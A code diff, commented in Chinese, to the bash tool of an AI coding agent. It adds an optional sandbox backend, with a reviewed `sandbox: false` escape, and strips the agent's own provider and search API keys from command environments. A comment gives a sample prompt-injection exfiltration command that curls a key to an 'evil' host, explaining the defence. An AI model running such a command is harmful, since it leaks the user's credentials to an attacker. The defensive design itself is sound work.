@@ -1,6 +1,6 @@
 // shell 一组:bash(前台跑命令;background: true 时挂进 agent.background)+ job_output / job_stop(后台作业的回读与停止)。
 //
-// **执行体在这层,队列在 core**——这正是「队列在 core,跑什么在产品」那句话的落地:
+// **执行体在这层,队列在 core**——这正是「队列在 core,跑什么在产品」那句话的落地（core 的 `background/types.ts`；这个包就是产品共用的那一份「跑什么」）:
 // core 的 startBackground / getBackground / killBackground 管闸/缓冲/收摊,这里只填「怎么起一个进程」
 // 和「怎么把缓冲与取消口摆给模型」。
 //
@@ -10,7 +10,9 @@
 import { getBackground, killBackground, listBackground, startBackground } from "@echo-agent/core/background";
 import { spawn, spawnSync, type ChildProcess } from "node:child_process";
 import { existsSync } from "node:fs";
-import { toolError, toolOk, type AgentBackground, type AgentToolResult, type ModelTool } from "@echo-agent/core";
+import { BUILTIN_PROVIDER_KEY_ENV, toolError, toolOk, type AgentBackground, type AgentToolResult, type ModelTool } from "@echo-agent/core";
+import { BRAVE_ENV } from "./web.ts";
+import { DIRECT_BACKEND, type ShellBackend } from "./sandbox.ts";
 
 /** 命令跑在什么环境里：`tool:shell` 段据此写明平台与 bash 版本（macOS 的 BSD 工具链、bash 3.2 的缺口）。 */
 export type ShellEnvironment = { platform: NodeJS.Platform; bashVersion: string | null };
@@ -76,9 +78,28 @@ const NON_INTERACTIVE_ENV = {
   GIT_TERMINAL_PROMPT: "0",
 } as const;
 
+/**
+ * 命令看不到的环境变量（2026-11-15）：echo 自己的 key——各家模型（`BUILTIN_PROVIDER_KEY_ENV`）与 web_search。
+ * 命令是模型给的，模型可能被注入的内容骗着跑 `curl https://evil/?k=$DEEPSEEK_API_KEY`；这些 key 命令本来也用不着。
+ * 用户自己的 token（`GITHUB_TOKEN`、`NPM_TOKEN` 这类）照旧传：`gh`、`npm` 要用，剥了会悄悄失去认证。
+ */
+const SECRET_ENV: ReadonlySet<string> = new Set([...BUILTIN_PROVIDER_KEY_ENV, BRAVE_ENV]);
+
+/** 起 shell 用的环境：父进程的去掉 `SECRET_ENV`，再盖上非交互的几项。 */
+export function shellEnv(parent: NodeJS.ProcessEnv, cwd: string): NodeJS.ProcessEnv {
+  const env: NodeJS.ProcessEnv = {};
+  for (const [k, v] of Object.entries(parent)) if (!SECRET_ENV.has(k)) env[k] = v;
+  return { ...env, ...NON_INTERACTIVE_ENV, PWD: cwd };
+}
+
 export type BashDeps = {
   /** 给了才支持 background: true(接 agent.background);job_output / job_stop 也读同一张表。 */
   background?: AgentBackground;
+  /**
+   * 命令怎么起（`sandbox.ts`）。缺省直接起。给的是沙箱时 bash 多一个 `sandbox` 参数：`false` = 这一条在沙箱外跑——
+   * 参数明着写在调用里，看得见它：安全分类器开着时由分类器判，关着时 echo-coding 的权限规则让人看（`permission.ts`）。
+   */
+  backend?: ShellBackend;
 };
 
 /**
@@ -87,7 +108,7 @@ export type BashDeps = {
  */
 export type ShellState = { cwd: string | undefined; workspace: string | undefined };
 
-/** shell 一组的全部工具。`echo:shell` 注册的与 `codingAgentIdentity()` 列的是**同一份**,不各写各的名单。 */
+/** shell 一组的全部工具。`echo:shell` 注册的与产品算行为 digest 时列的（`echo-coding` 的 `codingAgentIdentity()`）是**同一份**,不各写各的名单。 */
 export function makeShellTools(deps: BashDeps = {}): ModelTool[] {
   const state: ShellState = { cwd: undefined, workspace: undefined };
   return [makeBashTool(deps, state), jobOutputTool(deps), jobStopTool(deps)] as ModelTool[];
@@ -96,7 +117,10 @@ export function makeShellTools(deps: BashDeps = {}): ModelTool[] {
 export function makeBashTool(
   deps: BashDeps = {},
   state: ShellState = { cwd: undefined, workspace: undefined },
-): ModelTool<{ command: string; timeout_ms?: number; background?: boolean }> {
+): ModelTool<{ command: string; timeout_ms?: number; background?: boolean; sandbox?: boolean }> {
+  const backend = deps.backend ?? DIRECT_BACKEND;
+  /** 这一条用哪个后端：沙箱后端下带了 `sandbox: false` 就直接起。 */
+  const backendFor = (sandbox: boolean | undefined): ShellBackend => (backend.sandboxed && sandbox === false ? DIRECT_BACKEND : backend);
   /** 本次命令从哪起：保留的目录还在就用它；workspace 换了或目录被删了就退回 workspace（后者要告诉模型）。 */
   const startDir = (workspace: string): { cwd: string; note: string } => {
     if (state.workspace !== workspace) {
@@ -127,10 +151,15 @@ export function makeBashTool(
         command: { type: "string" },
         timeout_ms: { type: "number", description: "Timeout in milliseconds, default 120000" },
         background: { type: "boolean", description: "Run in the background (does not block this turn)" },
+        // 沙箱后端才有这个参数：没有沙箱时它什么也不改，摆出来只会让模型以为有
+        ...(backend.sandboxed
+          ? { sandbox: { type: "boolean", description: "false runs this command outside the sandbox; it is checked before it runs. Default true" } }
+          : {}),
       },
       required: ["command"],
     },
-    async execute({ command, timeout_ms, background }, ctx) {
+    async execute({ command, timeout_ms, background, sandbox }, ctx) {
+      const via = backendFor(sandbox);
       if (background === true) {
         if (deps.background === undefined) return toolError("This agent has no background queue; background: true is not supported");
         const r = startBackground(deps.background, {
@@ -138,7 +167,11 @@ export function makeBashTool(
           label: command.slice(0, 60),
           run: (bg) =>
             new Promise<void>((resolvePromise, rejectPromise) => {
-              const child = spawnShell(command, startDir(ctx.workspace).cwd);
+              const child = spawnShell(command, { cwd: startDir(ctx.workspace).cwd, workspace: ctx.workspace }, via);
+              if (typeof child === "string") {
+                rejectPromise(new Error(child));
+                return;
+              }
               // 每条流一只流式 decoder：跨 chunk 的多字节字符不再被解成替换符（review 2026-09-07）
               const outDec = new TextDecoder();
               const errDec = new TextDecoder();
@@ -168,7 +201,7 @@ export function makeBashTool(
       }
 
       const start = startDir(ctx.workspace);
-      const result = await runForeground(command, start.cwd, timeout_ms ?? DEFAULT_TIMEOUT_MS, ctx.signal);
+      const result = await runForeground(command, { cwd: start.cwd, workspace: ctx.workspace }, via, timeout_ms ?? DEFAULT_TIMEOUT_MS, ctx.signal);
       // 命令跑到了末尾才有标记（exec / 被杀 / 语法错都没有）：没有就保持原来的目录
       const changed = result.cwd !== undefined && result.cwd !== start.cwd;
       if (result.cwd !== undefined) state.cwd = result.cwd === ctx.workspace ? undefined : result.cwd;
@@ -188,17 +221,25 @@ function withCwdMarker(command: string): string {
  * 不然 `sleep 10`、dev server 这类由 bash 再起的子进程会活过 bash，攥着输出管道不放——超时/中止要等它自己结束，job_stop 也留孤儿。
  *
  * `bash -c`，不是登录 shell：登录 shell 会读 profile，macOS 上 `path_helper` 还会把系统目录排到 PATH 前面，
- * 用户装的 git / ruby / node 就变成了系统那一份。命令看到的环境与启动 echo-coding 的那个 shell 一致。
+ * 用户装的 git / ruby / node 就变成了系统那一份。命令看到的环境与启动 agent 的那个 shell 一致，只少 echo 自己的 key（`shellEnv`）。
  * `PWD` 例外，设成本次的起点：继承来的是父进程的目录，bash 发现它不指向当前目录就改用物理路径——
  * 工作区经软链时（macOS 的 `/var` → `/private/var`）`$PWD` 成了展开后的路径，第一条命令就被当成「cd 过了」。
  */
-function spawnShell(command: string, cwd: string): ChildProcess {
-  return spawn("bash", ["-c", command], {
-    cwd,
+function spawnShell(command: string, at: { cwd: string; workspace: string }, backend: ShellBackend): ChildProcess | string {
+  const launch = backend.argv(["bash", "-c", command], at);
+  if (!launch.ok) return sandboxRefusal(launch.reason);
+  const [file, ...args] = launch.argv;
+  return spawn(file!, args, {
+    cwd: at.cwd,
     stdio: ["ignore", "pipe", "pipe"],
     detached: true,
-    env: { ...process.env, ...NON_INTERACTIVE_ENV, PWD: cwd },
+    env: shellEnv(process.env, at.cwd),
   });
+}
+
+/** 沙箱起不来时给模型的话：为什么、怎么办（带 `sandbox: false` 重跑，那一步会被审）。 */
+function sandboxRefusal(reason: string): string {
+  return `Not run: commands are meant to run in a sandbox, but none is available on this machine (${reason}). Run it again with sandbox: false; that call is checked before it runs.`;
 }
 
 /** 输出里摘掉最后一个 cwd 标记（连同它前后各一个换行），返回标记里的目录。没有标记 = 命令没跑到末尾（exec / 被杀 / 语法错）。 */
@@ -284,12 +325,17 @@ function jobStopTool(deps: BashDeps): ModelTool<{ id: string }> {
 
 function runForeground(
   command: string,
-  cwd: string,
+  at: { cwd: string; workspace: string },
+  backend: ShellBackend,
   timeoutMs: number,
   signal?: AbortSignal,
 ): Promise<AgentToolResult & { cwd?: string }> {
   return new Promise((resolvePromise) => {
-    const child = spawnShell(withCwdMarker(command), cwd);
+    const child = spawnShell(withCwdMarker(command), at, backend);
+    if (typeof child === "string") {
+      resolvePromise(toolError(child));
+      return;
+    }
     let out = "";
     let truncated = false;
     let tail = ""; // 末尾几百字节单独留着：cwd 标记在这里找，输出被截断也丢不了
